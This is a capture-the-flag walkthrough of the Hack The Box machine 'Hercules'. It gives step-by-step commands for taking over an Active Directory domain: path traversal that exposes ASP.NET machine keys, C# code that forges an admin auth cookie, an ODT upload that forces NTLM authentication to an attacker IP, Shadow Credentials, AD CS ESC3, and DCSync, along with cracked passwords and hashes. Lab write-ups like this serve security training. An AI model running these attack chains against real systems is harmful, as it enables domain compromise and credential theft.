# HTB Hercules – Comprehensive Walkthrough

  

## Box summary

  

**Target:** `10.129.242.196`

**Platform:** Windows / Active Directory / IIS

**Difficulty:** Hard

**Main themes:**

- Kerberos user enumeration

- LDAP-backed web login

- ASP.NET Forms Authentication cookie forgery

- ODT-based NTLM capture

- Shadow Credentials

- AD CS abuse

- Timed OU / service account abuse

- Kerberos U2U / S4U abuse

  

---

  

## Final flags

  

- **user.txt**: `b4b1f7e[redacted]7afd5c18cbe`

- **root.txt**: `a5ee26[redacted]2500c6f8`

  

> Note: on this machine the **root flag is not in the usual Administrator desktop path**.

> It is in: `C:\Users\Admin\Desktop\root.txt`

  

---

  

## Big-picture attack path

  

This is the full chain we used:

  

1. Enumerate valid AD usernames with Kerberos.

2. Recover a working web credential: `ken.w : change*th1s_p@ssw()rd!!`

3. Log into the IIS portal and abuse LFI to read `web.config`.

4. Extract the ASP.NET `machineKey`.

5. Forge a Forms Auth cookie for `web_admin`.

6. Find the real upload form and upload a malicious ODT.

7. Capture `natalie.a`'s NetNTLMv2 hash with Responder and crack it.

8. Abuse Shadow Credentials to get `bob.w`.

9. Move `stephen.m` into the right OU so `natalie.a` can target him too.

10. Abuse Shadow Credentials again to get `stephen.m`.

11. Reset `auditor`.

12. Read `user.txt`.

13. Abuse Forest Migration OU permissions.

14. Re-enable and reset `fernando.r`.

15. Abuse AD CS to become `ashley.b`.

16. Hit the timing window around `IIS_Administrator`.

17. Reset `IIS_Webserver$`.

18. Use the machine account TGT session key to pivot into U2U / S4U.

19. Impersonate `Administrator`.

20. Dump the Administrator hash, get a TGT, and read `root.txt`.

  

---

  

# 1) Initial setup

  

## Add the target to hosts

  

```bash

echo "10.129.242.196 hercules.htb dc.hercules.htb" | sudo tee -a /etc/hosts

```

  

### Why

A lot of Kerberos and web steps depend on the hostname matching the domain.

If name resolution is wrong, Kerberos often fails in confusing ways.

  

---

  

## Keep the clock in sync

  

```bash

sudo ntpdate -b dc.hercules.htb

```

  

### Why

Kerberos is very sensitive to time skew.

If your clock is even a little off, good credentials can still fail with errors like:

  

- `KRB_AP_ERR_SKEW`

- `KDC_ERR_PREAUTH_FAILED` in misleading situations

  

We repeated this before important Kerberos steps.

  

---

  

# 2) Enumerate valid AD usernames

  

We built a username wordlist that matched the naming style used on the box:

  

- `firstname.lastinitial`

  

Example:

- `adriana.i`

- `ken.w`

- `natalie.a`

  

## Build the username list

  

```bash

awk 'NF{ for(i=97;i<=122;i++) printf "%s.%c\n", $0, i }' \

/usr/share/wordlists/seclists/Usernames/Names/names.txt > names_ad.txt

```

  

## Run kerbrute

  

```bash

TARGET=10.129.242.196

kerbrute userenum --dc $TARGET -d hercules.htb names_ad.txt -t 30 | tee kerb_users.txt

```

  

## Extract the valid users

  

```bash

sed -n 's/.*VALID USERNAME:[[:space:]]*\([^[:space:]]*@hercules\.htb\).*/\1/p' kerb_users.txt > users_full.txt

sed 's/@hercules\.htb$//' users_full.txt > users.txt

cat users.txt

```

  

### Why

This gives us a clean set of real domain users to work with.

That matters later for spraying, LDAP logic, and privilege escalation.

  

---

  

# 3) Recover the first working web credential

  

The first usable credential in the solve path was:

  

```text

ken.w : change*th1s_p@ssw()rd!!

```

  

We verified it with Kerberos/LDAP tooling.

  

## Validate the credential

  

```bash

sudo ntpdate -b dc.hercules.htb

  

netexec ldap 10.129.242.196 -u ken.w -p 'change*th1s_p@ssw()rd!!' -k

impacket-getTGT hercules.htb/ken.w:'change*th1s_p@ssw()rd!!' -dc-ip 10.129.242.196

```

  

### Why

We wanted to confirm that the account worked for the domain, not just for the website.

  

This step gave us:

- a confirmed valid credential

- a Kerberos ticket cache

- a stable starting point for the portal abuse

  

---

  

# 4) Log into the web portal and steal `web.config`

  

Once we had `ken.w`, we logged into the site properly and abused the file download function.

  

## Log into the portal with curl

  

```bash

TARGET=10.129.242.196

USER='ken.w'

PASS='change*th1s_p@ssw()rd!!'

BASE='https://hercules.htb'

  

rm -f /tmp/herc.jar /tmp/login.html /tmp/post.html /tmp/post.hdr web.config

  

curl -sk -c /tmp/herc.jar "$BASE/Login" -o /tmp/login.html

TOKEN=$(grep -oP 'name="__RequestVerificationToken"[^>]*value="\K[^"]+' /tmp/login.html | head -1)

  

curl -sk -L \

-b /tmp/herc.jar -c /tmp/herc.jar \

-H "Referer: $BASE/Login" \

-H "Origin: $BASE" \

--data-urlencode "__RequestVerificationToken=$TOKEN" \

--data-urlencode "Username=$USER" \

--data-urlencode "Password=$PASS" \

--data-urlencode "RememberMe=false" \

"$BASE/Login" \

-D /tmp/post.hdr \

-o /tmp/post.html

```

  

## Download `web.config`

  

```bash

curl -sk \

-b /tmp/herc.jar -c /tmp/herc.jar \

"$BASE/Home/Download?fileName=../../web.config" \

-o web.config

  

grep -iE 'machineKey|validationKey|decryptionKey' web.config

```

  

## The key material we extracted

  

```xml

<machineKey decryption="AES"

decryptionKey="B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581"

validation="HMACSHA256"

validationKey="EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80" />

```

  

### Why

`web.config` contains the ASP.NET Forms Authentication secrets.

If we know those keys, we can **forge our own valid `.ASPXAUTH` cookies**.

  

That lets us impersonate higher-privileged web users.

  

---

  

# 5) Forge a `.ASPXAUTH` cookie for `web_admin`

  

We created a small .NET program using `AspNetCore.LegacyAuthCookieCompat`.

  

## Create the project

  

```bash

mkdir -p ~/CookieForge

cd ~/CookieForge

dotnet new console -o LegacyAuthConsole

cd LegacyAuthConsole

dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5

```

  

## Replace `Program.cs`

  

```csharp

using System;

using AspNetCore.LegacyAuthCookieCompat;

  

class Program

{

static void Main(string[] args)

{

string validationKey = "EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80";

string decryptionKey = "B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581";

  

var issueDate = DateTime.Now;

var expiryDate = issueDate.AddHours(8);

  

var ticket = new FormsAuthenticationTicket(

1,

"web_admin",

issueDate,

expiryDate,

false,

"Web Administrators",

"/"

);

  

byte[] dec = HexUtils.HexToBinary(decryptionKey);

byte[] val = HexUtils.HexToBinary(validationKey);

var enc = new LegacyFormsAuthenticationTicketEncryptor(dec, val, ShaVersion.Sha256);

  

Console.WriteLine(enc.Encrypt(ticket));

}

}

```

  

## Build and generate the cookie

  

```bash

dotnet build

FORGED=$(dotnet run | tail -1)

printf '%s\n' "$FORGED"

```

  

## Test the cookie

  

```bash

curl -sk \

-H "Cookie: .ASPXAUTH=$FORGED" \

https://hercules.htb/Home \

-o /tmp/webadmin_home.html

```

  

If the page greets you as `web_admin`, it worked.

  

### Why

The website trusted the Forms Auth cookie.

So instead of trying to get a stronger real password, we forged a valid session for the admin web user.

  

This is much faster and cleaner than trying to attack the portal another way.

  

---

  

# 6) Find the real upload form

  

At first, guessed routes like `/Home/UploadReport` returned 404.

So we enumerated the live portal pages with the forged cookie.

  

The working admin routes included:

  

- `/Home`

- `/Home/Account`

- `/Home/Downloads`

- `/Home/Forms`

- `/Home/Mail`

- `/Home/Security`

  

The important one was:

  

```text

/Home/Forms

```

  

## What `/Home/Forms` exposed

  

It showed a real multipart upload form:

  

- action: `/Home/Forms`

- method: `POST`

- enctype: `multipart/form-data`

  

Fields:

- `__RequestVerificationToken`

- `Name`

- `Email`

- `Description`

- `UploadedFile`

  

### Why

This was the actual document submission form used by admins.

That meant we could upload a malicious ODT and force the server-side workflow to open it.

  

---

  

# 7) Build and upload a malicious ODT

  

## Generate `bad.odt`

  

We used Bad-ODF.

  

### Set up the tool

  

```bash

cd ~/tools

mkdir -p Bad-ODF && cd Bad-ODF

curl -L -o Bad-ODF.py https://raw.githubusercontent.com/lof1sec/Bad-ODF/main/Bad-ODF.py

  

python3 -m venv .venv

source .venv/bin/activate

python -m pip install --upgrade pip

python -m pip install ezodf lxml

  

python3 Bad-ODF.py

```

  

When prompted, enter your `tun0` IP:

  

```text

10.10.16.187

```

  

Confirm the file exists:

  

```bash

ls -l ~/tools/Bad-ODF/bad.odt

file ~/tools/Bad-ODF/bad.odt

```

  

## Start Responder

  

```bash

sudo responder -I tun0 -v

```

  

## Upload the ODT

  

```bash

cd ~/CookieForge/LegacyAuthConsole

FORGED=$(dotnet run | tail -1)

  

rm -f /tmp/webadmin_forms.jar /tmp/forms_live.html /tmp/forms_upload.hdr /tmp/forms_upload.html

  

curl -sk \

-H "Cookie: .ASPXAUTH=$FORGED" \

-c /tmp/webadmin_forms.jar \

https://hercules.htb/Home/Forms \

-o /tmp/forms_live.html

  

TOKEN=$(grep -oP 'name="__RequestVerificationToken"[^>]*value="\K[^"]+' /tmp/forms_live.html | head -1)

  

curl -sk \

-b /tmp/webadmin_forms.jar -c /tmp/webadmin_forms.jar \

-H "Cookie: .ASPXAUTH=$FORGED" \

-F "__RequestVerificationToken=$TOKEN" \

-F "Name=web_admin" \

-F "Email=web_admin@hercules.htb" \

-F "Description=Issue report" \

-F "UploadedFile=@$HOME/tools/Bad-ODF/bad.odt;type=application/vnd.oasis.opendocument.text" \

https://hercules.htb/Home/Forms \

-D /tmp/forms_upload.hdr \

-o /tmp/forms_upload.html

```

  

### Why

The ODT contains a remote reference that causes the target to authenticate back to our box over SMB.

  

We had to:

- keep the anti-forgery cookie jar

- keep the hidden token

- use the real field name `UploadedFile`

  

Without those, the upload broke.

  

---

  

# 8) Capture and crack `natalie.a`

  

Responder caught repeated NetNTLMv2 logons from:

  

```text

HERCULES\natalie.a

```

  

## Save one clean hash

  

```bash

cat > natalie.hash <<'EOF'

natalie.a::HERCULES:66544c09789b0473:5A7C142EC46171A2ECD9364E2AB1BBFF:010100000000000080681FC058CEDC019B481682157123C90000000002000800500047005300490001001E00570049004E002D0035005A00350038005800300058005A00580055004C0004003400570049004E002D0035005A00350038005800300058005A00580055004C002E0050004700530049002E004C004F00430041004C000300140050004700530049002E004C004F00430041004C000500140050004700530049002E004C004F00430041004C000700080080681FC058CEDC01060004000200000008003000300000000000000000000000002000002414D996857DFD26FB393BC5F7AA1293461318CBC517F48546945974D65883230A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310036002E003100380037000000000000000000

EOF

```

  

## Crack it with John

  

```bash

john --wordlist=/usr/share/wordlists/rockyou.txt natalie.hash

john --show natalie.hash

```

  

## Result

  

```text

natalie.a : Prettyprincess123!

```

  

### Why

Now we have a new real domain user with more interesting rights.

This is the pivot into AD privilege escalation.

  

---

  

# 9) Shadow Credentials to `bob.w`

  

## Get a TGT for `natalie.a`

  

```bash

TARGET=10.129.242.196

sudo ntpdate -b dc.hercules.htb

  

impacket-getTGT 'hercules.htb/natalie.a:Prettyprincess123!' -dc-ip $TARGET

export KRB5CCNAME=/home/kali/CookieForge/LegacyAuthConsole/natalie.a.ccache

```

  

## Abuse Shadow Credentials against `bob.w`

  

```bash

certipy-ad shadow auto \

-u natalie.a@hercules.htb \

-p 'Prettyprincess123!' \

-k \

-account bob.w \

-target dc.hercules.htb

```

  

## Result

  

```text

bob.w NT hash = 8a65c74e8f0073babbfac6725c66cc3f

```

  

### Why

Shadow Credentials let us add a temporary key to a user, authenticate as them with a certificate, retrieve their NT hash, then restore the old key.

  

This is excellent when:

- you have write rights over a target user

- but do not know their password

  

---

  

# 10) Move `stephen.m` into the Web Department OU

  

`natalie.a` could not directly target `stephen.m` until he was in the right OU.

  

So we used `bob.w` to move him.

  

## Get a TGT for `bob.w`

  

```bash

impacket-getTGT 'hercules.htb/bob.w' -hashes :8a65c74e8f0073babbfac6725c66cc3f -dc-ip $TARGET

export KRB5CCNAME=/home/kali/CookieForge/LegacyAuthConsole/bob.w.ccache

```

  

## Install PowerView.py in a venv

  

```bash

cd ~/tools

python3 -m venv pv

source ~/tools/pv/bin/activate

python -m pip install --upgrade pip

python -m pip install powerview

```

  

## Start PowerView.py

  

```bash

export KRB5CCNAME=/home/kali/CookieForge/LegacyAuthConsole/bob.w.ccache

powerview hercules.htb/bob.w@dc.hercules.htb -k --use-ldaps --dc-ip 10.129.242.196 --no-pass

```

  

## Move the object

  

```powershell

Set-DomainObjectDN -Identity stephen.m -DestinationDN 'OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb'

```

  

### Why

This is an OU-based permission problem.

The move places `stephen.m` where the rights chain becomes useful.

  

---

  

# 11) Shadow Credentials to `stephen.m`

  

Go back to `natalie.a`.

  

```bash

cd /home/kali/CookieForge/LegacyAuthConsole

impacket-getTGT 'hercules.htb/natalie.a:Prettyprincess123!' -dc-ip $TARGET

export KRB5CCNAME=/home/kali/CookieForge/LegacyAuthConsole/natalie.a.ccache

```

  

## Shadow the account

  

```bash

certipy-ad shadow auto \

-u natalie.a@hercules.htb \

-p 'Prettyprincess123!' \

-k \

-account stephen.m \

-target dc.hercules.htb

```

  

## Result

  

```text

stephen.m NT hash = 9aaaedcb19e612216a2dac9badb3c210

```

  

### Why

This gives us another privileged account in the chain, one that can reset `auditor`.

  

---

  

# 12) Reset `auditor`

  

## Get a TGT for `stephen.m`

  

```bash

impacket-getTGT 'hercules.htb/stephen.m' -hashes :9aaaedcb19e612216a2dac9badb3c210 -dc-ip $TARGET

export KRB5CCNAME=/home/kali/CookieForge/LegacyAuthConsole/stephen.m.ccache

```

  

## Reset the password

  

```bash

sudo ntpdate -b dc.hercules.htb

bloodyAD --host dc.hercules.htb -d hercules.htb -u stephen.m -k set password auditor 'Aa123456!'

```

  

## Get the `auditor` TGT

  

```bash

impacket-getTGT 'hercules.htb/auditor:Aa123456!' -dc-ip $TARGET

export KRB5CCNAME=/home/kali/CookieForge/LegacyAuthConsole/auditor.ccache

```

  

### Why

`auditor` is the key account for the second half of the box.

This is where the user flag becomes available and where the root chain begins.

  

---

  

# 13) Read the user flag

  

Some WinRM tools failed because of SPN / Kerberos service issues.

The tool that worked reliably was `winrmexec.py`.

  

## Read `user.txt`

  

```bash

python3 ~/tools/winrmexec/winrmexec.py -ssl -port 5986 -k -no-pass \

-X "type C:\\Users\\auditor\\Desktop\\user.txt" \

hercules.htb/auditor@dc.hercules.htb

```

  

## User flag

  

```text

b4b1f7e4[redacted]afd5c18cbe

```

  

### Why

We did not need an interactive shell.

A one-shot command was enough and avoided WinRM client issues.

  

---

  

# 14) Take control of the Forest Migration OU

  

Now the root chain begins.

  

## Use `auditor` to take ownership and `GenericAll`

  

```bash

cd /home/kali/CookieForge/LegacyAuthConsole

TARGET=10.129.242.196

export KRB5CCNAME=/home/kali/CookieForge/LegacyAuthConsole/auditor.ccache

  

bloodyAD --host dc.hercules.htb --dc-ip $TARGET -d hercules.htb -u auditor -k \

set owner 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' auditor

  

bloodyAD --host dc.hercules.htb --dc-ip $TARGET -d hercules.htb -u auditor -k \

add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' auditor

```

  

### Why

We need control over the OU because the accounts that matter next live there.

  

---

  

# 15) Re-enable and reset `fernando.r`

  

```bash

bloodyAD --host dc.hercules.htb --dc-ip $TARGET -d hercules.htb -u auditor -k \

remove uac 'fernando.r' -f ACCOUNTDISABLE

  

bloodyAD --host dc.hercules.htb --dc-ip $TARGET -d hercules.htb -u auditor -k \

set password 'fernando.r' 'NewPass123!'

```

  

## Get a TGT

  

```bash

impacket-getTGT 'HERCULES.HTB/fernando.r:NewPass123!' -dc-ip $TARGET

export KRB5CCNAME=/home/kali/CookieForge/LegacyAuthConsole/fernando.r.ccache

```

  

### Why

`fernando.r` can request the certificate templates we need for ESC3.

  

---

  

# 16) Abuse AD CS as `fernando.r` to become `ashley.b`

  

## Enrollment Agent certificate

  

```bash

certipy-ad req -u FERNANDO.R@hercules.htb -k -no-pass \

-target dc.hercules.htb -target-ip $TARGET \

-dc-host dc.hercules.htb -dc-ip $TARGET \

-ca 'CA-HERCULES' -template 'EnrollmentAgent' -dcom -out fernando_ea2

```

  

## Request a certificate on behalf of `ashley.b`

  

```bash

certipy-ad req -u FERNANDO.R@hercules.htb -k -no-pass \

-target dc.hercules.htb -target-ip $TARGET \

-dc-host dc.hercules.htb -dc-ip $TARGET \

-ca 'CA-HERCULES' -template 'UserSignature' \

-on-behalf-of 'hercules\ASHLEY.B' -pfx fernando_ea2.pfx -dcom

```

  

## Authenticate as `ashley.b`

  

```bash

certipy-ad auth -pfx ashley.b.pfx -dc-ip $TARGET -no-hash

```

  

This gives:

  

```text

ashley.b.ccache

```

  

### Why

This is the AD CS ESC3 abuse.

It lets us become `ashley.b` without ever knowing the password.

  

---

  

# 17) Trigger the cleanup timing window

  

This is the brittle part of the box.

  

The idea:

1. As `ashley.b`, run `aCleanup.ps1`

2. Wait a precise number of seconds

3. As `auditor`, quickly reapply OU rights

4. Immediately re-enable `IIS_Administrator` and reset its password

  

## Run the cleanup script

  

```bash

export KRB5CCNAME=/home/kali/CookieForge/LegacyAuthConsole/ashley.b.ccache

  

python3 ~/tools/winrmexec/winrmexec.py -ssl -port 5986 -k -no-pass \

-X "type C:\\Users\\ashley.b\\Desktop\\aCleanup.ps1" \

hercules.htb/ashley.b@dc.hercules.htb

  

python3 ~/tools/winrmexec/winrmexec.py -ssl -port 5986 -k -no-pass \

-X "powershell -ep bypass -File C:\\Users\\ashley.b\\Desktop\\aCleanup.ps1" \

hercules.htb/ashley.b@dc.hercules.htb

```

  

We confirmed the script effectively ran:

  

```powershell

Start-ScheduledTask -TaskName "Password Cleanup"

```

  

## Automated delay sweep

  

The delay that worked on the live box was **22 seconds**.

  

```bash

cd /home/kali/CookieForge/LegacyAuthConsole

TARGET=10.129.242.196

  

for DELAY in 21 22 23 24 25 26 27; do

echo "[*] Trying delay $DELAY"

  

export KRB5CCNAME=/home/kali/CookieForge/LegacyAuthConsole/ashley.b.ccache

python3 ~/tools/winrmexec/winrmexec.py -ssl -port 5986 -k -no-pass \

-X "powershell -ep bypass -File C:\\Users\\ashley.b\\Desktop\\aCleanup.ps1" \

hercules.htb/ashley.b@dc.hercules.htb >/tmp/cleanup.out 2>&1

  

sleep "$DELAY"

  

export KRB5CCNAME=/home/kali/CookieForge/LegacyAuthConsole/auditor.ccache

  

bloodyAD --host dc.hercules.htb --dc-ip $TARGET -d hercules.htb -u auditor -k \

add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' 'IT SUPPORT' >/tmp/g1.out 2>&1

  

bloodyAD --host dc.hercules.htb --dc-ip $TARGET -d hercules.htb -u auditor -k \

add genericAll 'OU=Forest Migration,OU=DCHERCULES,DC=hercules,DC=htb' auditor >/tmp/g2.out 2>&1

  

bloodyAD --host dc.hercules.htb --dc-ip $TARGET -d hercules.htb -u auditor -k \

remove uac 'IIS_Administrator' -f ACCOUNTDISABLE >/tmp/uac.out 2>&1

  

bloodyAD --host dc.hercules.htb --dc-ip $TARGET -d hercules.htb -u auditor -k \

set password 'IIS_Administrator' 'Passw0rd@123' >/tmp/pw.out 2>&1

  

if grep -qi "Password changed successfully" /tmp/pw.out; then

echo "[+] Window hit at delay $DELAY"

cat /tmp/uac.out

cat /tmp/pw.out

break

fi

done

```

  

### Live success

The window hit at delay **22**.

  

### Why

This is a race/timing condition.

Manually doing it is unreliable, so looping the delay is much better.

  

---

  

# 18) Get `IIS_Administrator` and reset `IIS_Webserver$`

  

## Get the TGT

  

```bash

impacket-getTGT 'HERCULES.HTB/IIS_Administrator:Passw0rd@123' -dc-ip 10.129.242.196

export KRB5CCNAME=/home/kali/CookieForge/LegacyAuthConsole/IIS_Administrator.ccache

```

  

## Reset the machine account password

  

```bash

bloodyAD --host dc.hercules.htb --dc-ip 10.129.242.196 -d hercules.htb -u IIS_Administrator -k \

set password 'IIS_Webserver$' 'Passw0rd@123'

```

  

### Why

Now we control the machine account too.

That is needed for the U2U / S4U trick that leads to Administrator.

  

---

  

# 19) Get the TGT for `IIS_Webserver$`

  

The NT hash of `Passw0rd@123` is:

  

```text

14d0fcda7ad363097760391f302da68d

```

  

## Request the TGT

  

```bash

impacket-getTGT 'HERCULES.HTB/IIS_Webserver$' -hashes ':14d0fcda7ad363097760391f302da68d' -dc-ip 10.129.242.196

export KRB5CCNAME=/home/kali/CookieForge/LegacyAuthConsole/IIS_Webserver$.ccache

```

  

### Why

We need this TGT so we can extract its session key and use it in the next trick.

  

---

  

# 20) Extract the TGT session key

  

```bash

describeTicket.py /home/kali/CookieForge/LegacyAuthConsole/IIS_Webserver$.ccache

```

  

The live session key was:

  

```text

9f393f[redacted]cbee058869

```

  

### Why

The next step abuses the machine account password change flow by using this session key as the new NT hash.

  

---

  

# 21) Change the machine account hash to the TGT session key

  

```bash

cd /home/kali/CookieForge/LegacyAuthConsole

TARGET=10.129.242.196

  

export KRB5CCNAME=/home/kali/CookieForge/LegacyAuthConsole/IIS_Webserver$.ccache

  

changepasswd.py -newhashes ':9f393ff5c05ecea7bbeec7cbee058869' \

'hercules.htb/IIS_Webserver$@dc.hercules.htb' \

-hashes ':14d0fcda7ad363097760391f302da68d' \

-dc-ip $TARGET -k

```

  

This succeeded on the live box.

  

### Why

This is the weird but critical step that makes the next U2U / S4U operation work.

  

---

  

# 22) Impersonate `Administrator` with U2U / S4U

  

```bash

getST.py -spn 'cifs/dc.hercules.htb' -impersonate Administrator \

-dc-ip $TARGET 'hercules.htb/IIS_Webserver$' -k -no-pass -u2u

```

  

This created:

  

```text

Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache

```

  

### Why

We are using the machine account to obtain a service ticket as `Administrator`.

  

That is the final Kerberos pivot before DCSync.

  

---

  

# 23) DCSync the `Administrator` NT hash

  

```bash

export KRB5CCNAME=/home/kali/CookieForge/LegacyAuthConsole/Administrator@cifs_dc.hercules.htb@HERCULES.HTB.ccache

  

secretsdump.py -k -no-pass dc.hercules.htb -dc-ip $TARGET -just-dc-user administrator

```

  

## Live result

  

```text

Administrator:500:aad3b435b51404eeaad3b435b51404ee:56855ee6b7570edefde6ac262200756e:::

```

  

### Why

Once we have the Administrator NT hash, the rest is straightforward:

- get a TGT

- read the final flag

  

---

  

# 24) Get the final Administrator TGT

  

```bash

cd /home/kali/CookieForge/LegacyAuthConsole

TARGET=10.129.242.196

  

impacket-getTGT 'HERCULES.HTB/Administrator' -hashes ':56855ee6b7570edefde6ac262200756e' -dc-ip $TARGET

export KRB5CCNAME=/home/kali/CookieForge/LegacyAuthConsole/Administrator.ccache

```

  

### Why

This gives us a full Administrator Kerberos identity for the box.

  

---

  

# 25) Read the root flag

  

Remember: this machine uses a non-standard root flag location.

  

```bash

python3 ~/tools/winrmexec/winrmexec.py -ssl -port 5986 -k -no-pass \

-X "cmd /c type C:\\Users\\Admin\\Desktop\\root.txt" \

hercules.htb/administrator@dc.hercules.htb

```

  

## Root flag

  

```text

a5ee2637[redacted]2500c6f8

```

  

---

  

# Important mistakes we hit and how to avoid them

  

## 1) Kerberos time drift

We hit time problems more than once.

  

### Fix

Run:

  

```bash

sudo ntpdate -b dc.hercules.htb

```

  

before sensitive Kerberos actions.

  

---

  

## 2) Wrong WinRM clients

Some WinRM clients failed because of SPN / Kerberos issues.

  

### Fix

`winrmexec.py` worked reliably with:

- `-ssl`

- `-k`

- `-no-pass`

  

---

  

## 3) Wrong upload route guess

Guessed routes like `/Home/UploadReport` did not exist on this live box.

  

### Fix

Enumerate the real admin routes and use `/Home/Forms`.

  

---

  

## 4) Bad upload POSTs

The upload only worked once we:

- kept the anti-forgery cookie jar

- reused the form token

- used the real field name `UploadedFile`

  

---

  

## 5) Using placeholders by mistake

A few times the only problem was using text like:

- `STEPHEN_HASH_HERE`

- `ADMIN_HASH_HERE`

- `SESSION_KEY_HEX_HERE`

  

instead of the real values.

  

### Fix

As soon as a real value is printed, substitute it immediately.

  

---

  

## 6) Root path timing window

The `IIS_Administrator` step is timing sensitive.

  

### Fix

Do not do it manually.

Use a loop across multiple delays. On the live box, **22 seconds** worked.

  

---

  

# Final answers

  

## User flag

  

```text

b4b1f7e[redacted]afd5c18cbe

```

  

## Root flag

  

```text

a5ee263[redacted]b2500c6f8

```

  

---

  

## Final note

  

This machine is a good example of why **reasoning about the environment** matters more than blindly following a tool:

  

- Kerberos required correct time

- WinRM required the right client

- the web route had to be discovered, not guessed

- the upload needed both token and cookie

- the final escalation depended on a precise timing window

  

Once each piece was understood, the box became very methodical.
